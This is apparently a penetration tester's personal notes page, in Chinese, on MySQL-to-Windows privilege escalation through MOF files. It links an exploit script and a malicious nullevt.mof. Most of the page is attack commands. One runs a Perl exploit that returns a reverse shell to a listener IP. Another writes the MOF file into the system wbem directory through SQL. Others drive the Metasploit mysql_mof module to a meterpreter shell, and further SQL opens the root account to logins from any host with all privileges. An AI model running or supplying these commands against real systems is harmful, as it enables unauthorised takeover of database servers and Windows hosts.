<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>mof提权</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>mof提权</h1><br/><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\179-mysql_win_remote.pl">Linked file: mysql_win_remote.pl </a></td></tr></table><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\179-nullevt.mof">Linked file: nullevt.mof </a></td></tr></table><br /><br /><br /><a href="http://blog.51cto.com/simeon/1981572">http://blog.51cto.com/simeon/1981572</a><br /><br />mof是windows系统的一个文件<br />（在c:/windows/system32/wbem/mof/nullevt.mof）<br />叫做&quot;托管对象格式&quot;其作用是每隔五秒就会去监控进程创建和死亡。<br /><br />这个mof当中有一段是vbs脚本<br /><br /><br />1、该漏洞的利用前提条件是必须具备 MySQL 的 root 权限，在 Kingcope 公布的 0day 中公布了一个 pl 利用脚本。<br />	<br />perl mysql_win_remote.pl 192.168.2.100 root &quot;&quot; 192.168.2.150 5555<br /><br />192.168.2.100 为 MySQL 数据库所在服务器，MySQL 口令为空，反弹到 192.168.2.150 的 5555 端口上。<br /><br /><br /><br />2、或者手动导入<br />执行以下查询语句，将上面生成的 nullevt.mof 导入到 c:\windows\system32\wbem\mof\ 目录下在windows7 中默认是拒绝访问的。导入后系统会自动运行，执行命令。<br />mof中需要修改相应的地址和端口<br />select load_file(&#39;C:\\RECYCLER\\nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;<br /><br />3、Msf直接mof提权<br /><br />Msf 下的 exploit/windows/mysql/mysql_mof 模块提供了直接 Mof 提权，不过该漏洞成功跟操作系统权限和Mysql数据库版本有关，执行成功后会直接反弹 shell 到 meterpreter。<br /><br /><br />use exploit/windows/mysql/mysql_mof<br />set rhost 192.168.157.1 //设置需要提权的远程主机IP地址<br />set rport 3306 //设置mysql的远程端口<br />set password root //设置mysql数据库root密码<br />set username root //设置mysql用户名<br />options //查看设置<br />run 0<br /><br /><br />4、要是能够通过网页连接管理（phpmyadmin），则可以修改host为“%”并刷新权限后，则可以通过msf等工具远程连接数据库。默认root等账号不允许远程连接，除非管理员或者数据库用户自己设置。<br /><br /><br /><br /><br />方法1：本地登入mysql，更改 &quot;mysql&quot; 数据库里的 &quot;user&quot; 表里的 &quot;host&quot; 项，将&quot;localhost&quot;改为&quot;%&quot;<br />	<br /> use mysql;<br /> update user set host = &#39;%&#39; where user = &#39;root&#39;;<br /> FLUSH PRIVILEGES ;<br /> select host, user from user;<br /><br /><br />方法2：直接授权(推荐)<br /><br />从任何主机上使用root用户，密码：youpassword（你的root密码）连接到mysql服务器：<br />	<br /># mysql -u root -proot<br />GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;youpassword&#39; WITH GRANT OPTION;<br />FLUSH PRIVILEGES;<br /><br />推荐重新增加一个用户，在实际测试过程中发现很多服务器使用root配置了多个地址，修改后可能会影响实际系统的运行。在实际测试过程中因此建议新增一个用户，授权所有权限，而不是直接更改root配置。<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>